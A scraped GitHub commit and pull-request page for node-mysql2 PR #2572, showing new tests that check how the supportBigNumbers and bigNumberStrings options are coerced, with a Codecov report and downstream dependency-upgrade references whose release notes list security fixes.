[View file](/sidorares/node-mysql2/blob/74abf9ef94d76114d9a09415e28b496522a94805/test/esm/unit/parsers/big-numbers-strings-sanitization.test.mjs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,66 @@ |
|  |  | import { describe, test, assert } from 'poku'; |
|  |  | import { createConnection, describeOptions } from '../../../common.test.cjs'; |
|  |  |  |
|  |  | const connection = createConnection().promise(); |
|  |  |  |
|  |  | const sql = 'SELECT 9007199254740991+100 AS `total`'; |
|  |  |  |
|  |  | describe('bigNumberStrings Sanitization', describeOptions); |
|  |  |  |
|  |  | Promise.all([ |
|  |  | test(async () => { |
|  |  | const [results] = await connection.query({ |
|  |  | sql, |
|  |  | supportBigNumbers: true, |
|  |  | bigNumberStrings: true, |
|  |  | }); |
|  |  |  |
|  |  | assert.strictEqual( |
|  |  | typeof results[0].total, |
|  |  | 'string', |
|  |  | 'Valid bigNumberStrings enabled', |
|  |  | ); |
|  |  | }), |
|  |  | test(async () => { |
|  |  | const [results] = await connection.query({ |
|  |  | sql, |
|  |  | supportBigNumbers: false, |
|  |  | bigNumberStrings: false, |
|  |  | }); |
|  |  |  |
|  |  | assert.strictEqual( |
|  |  | typeof results[0].total, |
|  |  | 'number', |
|  |  | 'Valid bigNumberStrings disabled', |
|  |  | ); |
|  |  | }), |
|  |  |  |
|  |  | test(async () => { |
|  |  | const [results] = await connection.query({ |
|  |  | sql, |
|  |  | supportBigNumbers: 'text', |
|  |  | bigNumberStrings: 'text', |
|  |  | }); |
|  |  |  |
|  |  | assert.strictEqual( |
|  |  | typeof results[0].total, |
|  |  | 'string', |
|  |  | 'bigNumberStrings as a random string should be enabled', |
|  |  | ); |
|  |  | }), |
|  |  | test(async () => { |
|  |  | const [results] = await connection.query({ |
|  |  | sql, |
|  |  | supportBigNumbers: '', |
|  |  | bigNumberStrings: '', |
|  |  | }); |
|  |  |  |
|  |  | assert.strictEqual( |
|  |  | typeof results[0].total, |
|  |  | 'number', |
|  |  | 'bigNumberStrings as an empty string should be disabled', |
|  |  | ); |
|  |  | }), |
|  |  | ]).then(async () => { |
|  |  | await connection.end(); |
|  |  | }); |

62 changes: 62 additions & 0 deletions

62
[test/esm/unit/parsers/support-big-numbers-sanitization.test.mjs](#diff-3da3c6b0f175dc8655a80e2f3d802a2fede4bb0aed4c0c43e2f67ba01279ca9e "test/esm/unit/parsers/support-big-numbers-sanitization.test.mjs")

Show comments

[View file](/sidorares/node-mysql2/blob/74abf9ef94d76114d9a09415e28b496522a94805/test/esm/unit/parsers/support-big-numbers-sanitization.test.mjs)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,62 @@ |
|  |  | import { describe, test, assert } from 'poku'; |
|  |  | import { createConnection, describeOptions } from '../../../common.test.cjs'; |
|  |  |  |
|  |  | const connection = createConnection().promise(); |
|  |  |  |
|  |  | const sql = 'SELECT 9007199254740991+100 AS `total`'; |
|  |  |  |
|  |  | describe('supportBigNumbers Sanitization', describeOptions); |
|  |  |  |
|  |  | Promise.all([ |
|  |  | test(async () => { |
|  |  | const [results] = await connection.query({ |
|  |  | sql, |
|  |  | supportBigNumbers: true, |
|  |  | }); |
|  |  |  |
|  |  | assert.strictEqual( |
|  |  | typeof results[0].total, |
|  |  | 'string', |
|  |  | 'Valid supportBigNumbers enabled', |
|  |  | ); |
|  |  | }), |
|  |  | test(async () => { |
|  |  | const [results] = await connection.query({ |
|  |  | sql, |
|  |  | supportBigNumbers: false, |
|  |  | }); |
|  |  |  |
|  |  | assert.strictEqual( |
|  |  | typeof results[0].total, |
|  |  | 'number', |
|  |  | 'Valid supportBigNumbers disabled', |
|  |  | ); |
|  |  | }), |
|  |  |  |
|  |  | test(async () => { |
|  |  | const [results] = await connection.query({ |
|  |  | sql, |
|  |  | supportBigNumbers: 'text', |
|  |  | }); |
|  |  |  |
|  |  | assert.strictEqual( |
|  |  | typeof results[0].total, |
|  |  | 'string', |
|  |  | 'supportBigNumbers as a random string should be enabled', |
|  |  | ); |
|  |  | }), |
|  |  | test(async () => { |
|  |  | const [results] = await connection.query({ |
|  |  | sql, |
|  |  | supportBigNumbers: '', |
|  |  | }); |
|  |  |  |
|  |  | assert.strictEqual( |
|  |  | typeof results[0].total, |
|  |  | 'number', |
|  |  | 'supportBigNumbers as an empty string should be disabled', |
|  |  | ); |
|  |  | }), |
|  |  | ]).then(async () => { |
|  |  | await connection.end(); |
|  |  | }); |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `74abf9e`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsidorares%2Fnode-mysql2%2Fcommit%2F74abf9ef94d76114d9a09415e28b496522a94805) to comment.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_c761a5bb_20250111_190415.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsidorares%2Fnode-mysql2%2Fpull%2F2572)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsidorares%2Fnode-mysql2%2Fpull%2F2572)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=sidorares%2Fnode-mysql2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[sidorares](/sidorares)
/
**[node-mysql2](/sidorares/node-mysql2)**
Public

* [Notifications](/login?return_to=%2Fsidorares%2Fnode-mysql2) You must be signed in to change notification settings
* [Fork
  625](/login?return_to=%2Fsidorares%2Fnode-mysql2)
* [Star
   4.1k](/login?return_to=%2Fsidorares%2Fnode-mysql2)

* [Code](/sidorares/node-mysql2)
* [Issues
  432](/sidorares/node-mysql2/issues)
* [Pull requests
  52](/sidorares/node-mysql2/pulls)
* [Discussions](/sidorares/node-mysql2/discussions)
* [Actions](/sidorares/node-mysql2/actions)
* [Projects
  0](/sidorares/node-mysql2/projects)
* [Wiki](/sidorares/node-mysql2/wiki)
* [Security](/sidorares/node-mysql2/security)
* [Insights](/sidorares/node-mysql2/pulse)

Additional navigation options

* [Code](/sidorares/node-mysql2)
* [Issues](/sidorares/node-mysql2/issues)
* [Pull requests](/sidorares/node-mysql2/pulls)
* [Discussions](/sidorares/node-mysql2/discussions)
* [Actions](/sidorares/node-mysql2/actions)
* [Projects](/sidorares/node-mysql2/projects)
* [Wiki](/sidorares/node-mysql2/wiki)
* [Security](/sidorares/node-mysql2/security)
* [Insights](/sidorares/node-mysql2/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fsidorares%2Fnode-mysql2%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fsidorares%2Fnode-mysql2%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# fix(security): improve sanitization for big numbers support #2572

 Merged

[wellwelwel](/wellwelwel)
merged 1 commit into
[sidorares:master](/sidorares/node-mysql2/tree/master "sidorares/node-mysql2:master")
from
[wellwelwel:sanitization](/wellwelwel/node-mysql2/tree/sanitization "wellwelwel/node-mysql2:sanitization")

Apr 9, 2024

 Merged

# [fix(security): improve sanitization for big numbers support](#top) #2572

[wellwelwel](/wellwelwel)
merged 1 commit into
[sidorares:master](/sidorares/node-mysql2/tree/master "sidorares/node-mysql2:master")
from
[wellwelwel:sanitization](/wellwelwel/node-mysql2/tree/sanitization "wellwelwel/node-mysql2:sanitization")

Apr 9, 2024

[Conversation
2](/sidorares/node-mysql2/pull/2572)
[Commits
1](/sidorares/node-mysql2/pull/2572/commits)
[Checks
64](/sidorares/node-mysql2/pull/2572/checks)
[Files changed](/sidorares/node-mysql2/pull/2572/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![wellwelwel](https://avatars.githubusercontent.com/u/46850407?s=60&v=4)](/wellwelwel)

Copy link

Collaborator

### @wellwelwel **[wellwelwel](/wellwelwel)** commented [Apr 9, 2024](#issue-2232418930)

This *PR* continues the [#2424](https://github.com/sidorares/node-mysql2/pull/2424) work, ensuring the type of parameters received in the connection and query options for both text and binary parsers.

Sorry, something went wrong.

All reactions

[![@wellwelwel](https://avatars.githubusercontent.com/u/46850407?s=40&v=4)](/wellwelwel)

`[fix(security): improve supportBigNumbers and bigNumberStrings sanitiz‚Ä¶](/sidorares/node-mysql2/pull/2572/commits/c6f329d7f97af3354278f10b997d8406bd9dd136 "fix(security): improve supportBigNumbers and bigNumberStrings sanitization")`
 ‚Ä¶

`[c6f329d](/sidorares/node-mysql2/pull/2572/commits/c6f329d7f97af3354278f10b997d8406bd9dd136)`

```
‚Ä¶ation
```

[![@wellwelwel](https://avatars.githubusercontent.com/u/46850407?s=40&u=160083a6f7b3730e2fa08669dc97d1b7db7187cc&v=4)](/wellwelwel)
[wellwelwel](/wellwelwel)
added
[enhancement](/sidorares/node-mysql2/labels/enhancement)
[security](/sidorares/node-mysql2/labels/security)
labels
[Apr 9, 2024](#event-12400068297)

[![@codecov](https://avatars.githubusercontent.com/in/254?s=80&v=4)](/apps/codecov)
[![Codecov](https://avatars.githubusercontent.com/in/254?s=40&u=c392dd7c2afc51fe2347d4296afa8494ac05772e&v=4)](https://github.com/apps/codecov)

Copy link

### **[codecov](/apps/codecov) bot** commented [Apr 9, 2024](#issuecomment-2043962790)

|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| [Codecov](https://app.codecov.io/gh/sidorares/node-mysql2/pull/2572?dropdown=coverage&src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov) Report Attention: Patch coverage is `96.87500%` with `1 lines` in your changes are missing coverage. Please review.  Project coverage is 90.31%. Comparing base [(`8a818ce`)](https://app.codecov.io/gh/sidorares/node-mysql2/commit/8a818ce0f30654eba854759e6409c0ac856fc448?dropdown=coverage&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov) to head [(`c6f329d`)](https://app.codecov.io/gh/sidorares/node-mysql2/pull/2572?dropdown=coverage&src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov).   | [Files](https://app.codecov.io/gh/sidorares/node-mysql2/pull/2572?dropdown=coverage&src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov) | Patch % | Lines | | --- | --- | --- | | [lib/parsers/text\_parser.js](https://app.codecov.io/gh/sidorares/node-mysql2/pull/2572?src=pr&el=tree&filepath=lib%2Fparsers%2Ftext_parser.js&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov#diff-bGliL3BhcnNlcnMvdGV4dF9wYXJzZXIuanM=) | 96.15% | [1 Missing ‚ö†Ô∏è](https://app.codecov.io/gh/sidorares/node-mysql2/pull/2572?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov) |   Additional details and impacted files ``` @@           Coverage Diff           @@ ##           master    #2572   +/-   ## =======================================   Coverage   90.31%   90.31%            =======================================   Files          71       71              Lines       15700    15708    +8        Branches     1332     1332            ======================================= + Hits        14179    14187    +8        Misses       1521     1521            ```  | [Flag](https://app.codecov.io/gh/sidorares/node-mysql2/pull/2572/flags?src=pr&el=flags&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov) | Coverage Œî |  | | --- | --- | --- | | [compression-0](https://app.codecov.io/gh/sidorares/node-mysql2/pull/2572/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov) | `90.31% <96.87%> (+<0.01%)` | ‚¨ÜÔ∏è | | [compression-1](https://app.codecov.io/gh/sidorares/node-mysql2/pull/2572/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov) | `90.31% <96.87%> (+<0.01%)` | ‚¨ÜÔ∏è | | [tls-0](https://app.codecov.io/gh/sidorares/node-mysql2/pull/2572/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov) | `89.83% <96.87%> (+<0.01%)` | ‚¨ÜÔ∏è | | [tls-1](https://app.codecov.io/gh/sidorares/node-mysql2/pull/2572/flags?src=pr&el=flag&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov) | `90.13% <96.87%> (+<0.01%)` | ‚¨ÜÔ∏è |   Flags with carried forward coverage won't be shown. [Click here](https://docs.codecov.io/docs/carryforward-flags?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov#carryforward-flags-in-the-pull-request-comment) to find out more.  [‚òî View full report in Codecov by Sentry](https://app.codecov.io/gh/sidorares/node-mysql2/pull/2572?dropdown=coverage&src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov). üì¢ Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Andrey+Sidorov). |

All reactions

Sorry, something went wrong.

 [![@wellwelwel](https://avatars.githubusercontent.com/u/46850407?s=40&u=160083a6f7b3730e2fa08669dc97d1b7db7187cc&v=4)](/wellwelwel)
[wellwelwel](/wellwelwel)
marked this pull request as ready for review
[April 9, 2024 01:20](#event-12400116289)

[![@wellwelwel](https://avatars.githubusercontent.com/u/46850407?s=80&u=160083a6f7b3730e2fa08669dc97d1b7db7187cc&v=4)](/wellwelwel)

Copy link

Collaborator

Author

### **[wellwelwel](/wellwelwel)** commented [Apr 9, 2024](#issuecomment-2043983639)

| [@sidorares](https://github.com/sidorares), as these changes are simple, I'll merge it to release in [#2566](https://github.com/sidorares/node-mysql2/pull/2566) (`3.9.4`) and follow the same way from [#2529](https://github.com/sidorares/node-mysql2/pull/2529) (manually edit the *Changelog.md* to preserve the commit description). |
| --- |

All reactions

Sorry, something went wrong.

 Hide details
View details

[![@wellwelwel](https://avatars.githubusercontent.com/u/46850407?s=40&u=160083a6f7b3730e2fa08669dc97d1b7db7187cc&v=4)](/wellwelwel)
[wellwelwel](/wellwelwel)
merged commit [`74abf9e`](/sidorares/node-mysql2/commit/74abf9ef94d76114d9a09415e28b496522a94805)
into
sidorares:master

[Apr 9, 2024](https://github.com/sidorares/node-mysql2/pull/2572#event-12400206293)
64 checks passed

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
mentioned this pull request
[Apr 8, 2024](#ref-pullrequest-2230778773)

[chore(master): release 3.9.4
#2566](/sidorares/node-mysql2/pull/2566)
 Merged

[![@wellwelwel](https://avatars.githubusercontent.com/u/46850407?s=40&u=160083a6f7b3730e2fa08669dc97d1b7db7187cc&v=4)](/wellwelwel)
[wellwelwel](/wellwelwel)
mentioned this pull request
[Apr 9, 2024](#ref-pullrequest-2232659647)

[fix(security): improve results object creation
#2574](/sidorares/node-mysql2/pull/2574)
 Merged

 [![@wellwelwel](https://avatars.githubusercontent.com/u/46850407?s=40&u=160083a6f7b3730e2fa08669dc97d1b7db7187cc&v=4)](/wellwelwel)
[wellwelwel](/wellwelwel)
deleted the
sanitization

branch
[April 9, 2024 09:45](#event-12404033556)

[![@derrickmehaffy](https://avatars.githubusercontent.com/u/8593673?s=40&v=4)](/derrickmehaffy)
[derrickmehaffy](/derrickmehaffy)
mentioned this pull request
[Apr 15, 2024](#ref-pullrequest-2244643615)

[Chore: Upgrade mysql2 from 3.6.0 to 3.9.4
strapi/strapi#20123](/strapi/strapi/pull/20123)
 Merged

This was referenced May 19, 2024

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.9.7
TheLastArchive/wrapped-for-discord#424](/TheLastArchive/wrapped-for-discord/pull/424)
 Open

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.9.7
TheLastArchive/wrapped-for-discord#428](/TheLastArchive/wrapped-for-discord/pull/428)
 Open

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.9.7
TheLastArchive/wrapped-for-discord#432](/TheLastArchive/wrapped-for-discord/pull/432)
 Open

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.9.7
TheLastArchive/wrapped-for-discord#436](/TheLastArchive/wrapped-for-discord/pull/436)
 Open

[![@HelenaMission](https://avatars.githubusercontent.com/u/132238788?s=40&v=4)](/HelenaMission)
[HelenaMission](/HelenaMission)
mentioned this pull request
[May 24, 2024](#ref-pullrequest-2315668345)

[[Snyk] Upgrade mysql2 from 3.6.0 to 3.9.7
jvvillanueva9104/CI-CD-Backend-Project#56](/jvvillanueva9104/CI-CD-Backend-Project/pull/56)
 Open

[![@nvmitsme](https://avatars.githubusercontent.com/u/60306467?s=40&v=4)](/nvmitsme)
[nvmitsme](/nvmitsme)
mentioned this pull request
[May 24, 2024](#ref-pullrequest-2316145281)

[[Snyk] Upgrade mysql2 from 3.2.3 to 3.9.7
nvmitsme/labman\_backend#25](/nvmitsme/labman_backend/pull/25)
 Open

[![@X-oss-byte](https://avatars.githubusercontent.com/u/136061549?s=40&v=4)](/X-oss-byte)
[X-oss-byte](/X-oss-byte)
mentioned this pull request
[May 24, 2024](#ref-pullrequest-2316250696)

[[Snyk] Upgrade mysql2 from 3.2.0 to 3.9.7
X-oss-byte/mempool#75](/X-oss-byte/mempool/pull/75)
 Open

[![@HelenaMission](https://avatars.githubusercontent.com/u/132238788?s=40&v=4)](/HelenaMission)
[HelenaMission](/HelenaMission)
mentioned this pull request
[May 25, 2024](#ref-pullrequest-2316667555)

[[Snyk] Upgrade mysql2 from 3.6.0 to 3.9.7
HelenaMission/DevOps-CICD-For-Car-Insurance-Quote-App#28](/HelenaMission/DevOps-CICD-For-Car-Insurance-Quote-App/pull/28)
 Open

[![@diyakou](https://avatars.githubusercontent.com/u/98399498?s=40&v=4)](/diyakou)
[diyakou](/diyakou)
mentioned this pull request
[May 25, 2024](#ref-pullrequest-2316776411)

[[Snyk] Upgrade mysql2 from 3.5.0 to 3.9.7
diyakou/Chatgpt#105](/diyakou/Chatgpt/pull/105)
 Open

This was referenced May 25, 2024

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.9.7
TheLastArchive/wrapped-for-discord#440](/TheLastArchive/wrapped-for-discord/pull/440)
 Open

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.9.7
TheLastArchive/wrapped-for-discord#444](/TheLastArchive/wrapped-for-discord/pull/444)
 Open

[[Snyk] Upgrade mysql2 from 3.6.1 to 3.9.7
TheLastArchive/wrapped-for-discord#448](/TheLastArchive/wrapped-for-discord/pull/448)
 Open

[![@q1blue](https://avatars.githubusercontent.com/u/105375894?s=40&v=4)](/q1blue)
[q1blue](/q1blue)
mentioned this pull request
[May 28, 2024](#ref-pullrequest-2321282734)

[[Snyk] Upgrade mysql2 from 2.3.3 to 3.9.7
https-quantumblockchainai-atlassian-net/ossinsight#730](/https-quantumblockchainai-atlassian-net/ossinsight/pull/730)
 Open

[Vylpes](/Vylpes)
pushed a commit
to Vylpes/Droplet
that referenced
this pull request
[May 28, 2024](#ref-commit-3c5c1bb)
[![@Vylpes](https://avatars.githubusercontent.com/u/8274970?s=40&v=4)](/Vylpes)

`[Update dependency mysql2 to v3.9.7 (#304)](/Vylpes/Droplet/commit/3c5c1bb0b07e3cf6cb360197e47aaa050b52b40d "Update dependency mysql2 to v3.9.7 (#304)

This PR contains the following updates:

| Package | Type | Update | Change |
|---|---|---|---|
| [mysql2](https://sidorares.github.io/node-mysql2/docs) ([source](https://github.com/sidorares/node-mysql2)) | dependencies | patch | [`3.9.3` -> `3.9.7`](https://renovatebot.com/diffs/npm/mysql2/3.9.3/3.9.7) |

---

### Release Notes

<details>
<summary>sidorares/node-mysql2 (mysql2)</summary>

### [`v3.9.7`](https://github.com/sidorares/node-mysql2/blob/HEAD/Changelog.md#397-2024-04-21)

[Compare Source](https://github.com/sidorares/node-mysql2/compare/v3.9.6...v3.9.7)

##### Bug Fixes

-   **security:** sanitize timezone parameter value to prevent code injection ([#&#8203;2608](https://github.com/sidorares/node-mysql2/issues/2608)) ([7d4b098](https://github.com/sidorares/node-mysql2/commit/7d4b098c7e29d5a6cb9eac2633bfcc2f0f1db713))

### [`v3.9.6`](https://github.com/sidorares/node-mysql2/blob/HEAD/Changelog.md#396-2024-04-18)

[Compare Source](https://github.com/sidorares/node-mysql2/compare/v3.9.5...v3.9.6)

##### Bug Fixes

-   binary parser sometimes reads out of packet bounds when results contain null and typecast is false ([#&#8203;2601](https://github.com/sidorares/node-mysql2/issues/2601)) ([705835d](https://github.com/sidorares/node-mysql2/commit/705835d06ff437cf0bf3169dac0a5f68002c4f87))

### [`v3.9.5`](https://github.com/sidorares/node-mysql2/blob/HEAD/Changelog.md#395-2024-04-17)

[Compare Source](https://github.com/sidorares/node-mysql2/compare/v3.9.4...v3.9.5)

##### Bug Fixes

-   revert breaking change in results creation ([#&#8203;2591](https://github.com/sidorares/node-mysql2/issues/2591)) ([f7c60d0](https://github.com/sidorares/node-mysql2/commit/f7c60d01a49666130f51d3847ccfdd3d6e3d33e9))

### [`v3.9.4`](https://github.com/sidorares/node-mysql2/blob/HEAD/Changelog.md#394-2024-04-09)

[Compare Source](https://github.com/sidorares/node-mysql2/compare/v3.9.3...v3.9.4)

##### Bug Fixes

-   **docs:** improve the contribution guidelines ([#&#8203;2552](https://github.com/sidorares/node-mysql2/issues/2552)) ([8a818ce](https://github.com/sidorares/node-mysql2/commit/8a818ce0f30654eba854759e6409c0ac856fc448))
-   **security:** improve results object creation ([#&#8203;2574](https://github.com/sidorares/node-mysql2/issues/2574)) ([4a964a3](https://github.com/sidorares/node-mysql2/commit/4a964a3910a4b8de008696c554ab1b492e9b4691))
-   **security:** improve supportBigNumbers and bigNumberStrings sanitization ([#&#8203;2572](https://github.com/sidorares/node-mysql2/issues/2572)) ([74abf9e](https://github.com/sidorares/node-mysql2/commit/74abf9ef94d76114d9a09415e28b496522a94805))

</details>

---

### Configuration

üìÖ **Schedule**: Branch creation - At any time (no schedule defined), Automerge - At any time (no schedule defined).

üö¶ **Automerge**: Disabled by config. Please merge this manually once you are satisfied.

‚ôª **Rebasing**: Whenever PR becomes conflicted, or you tick the rebase/retry checkbox.

üîï **Ignore**: Close this PR and you won't be reminded about this update again.

---

 - [ ] <!-- rebase-check -->If you want to rebase/retry this PR, check this box

---

This PR has been generated by [Renovate Bot](https://github.com/renovatebot/renovate).
<!--renovate-debug:eyJjcmVhdGVkSW5WZXIiOiIzNy4wLjAiLCJ1cGRhdGVkSW5WZXIiOiIzNy4wLjAiLCJ0YXJnZXRCcmFuY2giOiJkZXZlbG9wIn0=-->

Reviewed-on: https://git.vylpes.xyz/RabbitLabs/Droplet/pulls/304
Co-authored-by: Renovate Bot <renovate@vylpes.com>
Co-committed-by: Renovate Bot <renovate@vylpes.com>")`
‚Ä¶

`[3c5c1bb](/Vylpes/Droplet/commit/3c5c1bb0b07e3cf6cb360197e47aaa050b52b40d)`

```
This PR contains the following updates:

| Package | Type | Update | Change |
|---|---|---|---|
| [mysql2](<https://sidorares.github.io/node-mysql2/docs>) ([source](<https://github.com/sidorares/node-mysql2>)) | dependencies | patch | [`3.9.3` -> `3.9.7`](<https://renovatebot.com/diffs/npm/mysql2/3.9.3/3.9.7>) |

---

### Release Notes

<details>
<summary>sidorares/node-mysql2 (mysql2)</summary>

### [`v3.9.7`](<https://github.com/sidorares/node-mysql2/blob/HEAD/Changelog.md#397-2024-04-21>)

[Compare Source]([sidorares/node-mysql2@v3.9.6...v3.9.7](https://github.com/sidorares/node-mysql2/compare/v3.9.6...v3.9.7))

##### Bug Fixes

-   **security:** sanitize timezone parameter value to prevent code injection ([#&#8203;2608]([sidorares/node-mysql2#2608](https://github.com/sidorares/node-mysql2/pull/2608))) ([7d4b098]([sidorares/node-mysql2@7d4b098](https://github.com/sidorares/node-mysql2/commit/7d4b098c7e29d5a6cb9eac2633bfcc2f0f1db713)))

### [`v3.9.6`](<https://github.com/sidorares/node-mysql2/blob/HEAD/Changelog.md#396-2024-04-18>)

[Compare Source]([sidorares/node-mysql2@v3.9.5...v3.9.6](https://github.com/sidorares/node-mysql2/compare/v3.9.5...v3.9.6))

##### Bug Fixes

-   binary parser sometimes reads out of packet bounds when results contain null and typecast is false ([#&#8203;2601]([sidorares/node-mysql2#2601](https://github.com/sidorares/node-mysql2/pull/2601))) ([705835d]([sidorares/node-mysql2@705835d](https://github.com/sidorares/node-mysql2/commit/705835d06ff437cf0bf3169dac0a5f68002c4f87)))

### [`v3.9.5`](<https://github.com/sidorares/node-mysql2/blob/HEAD/Changelog.md#395-2024-04-17>)

[Compare Source]([sidorares/node-mysql2@v3.9.4...v3.9.5](https://github.com/sidorares/node-mysql2/compare/v3.9.4...v3.9.5))

##### Bug Fixes

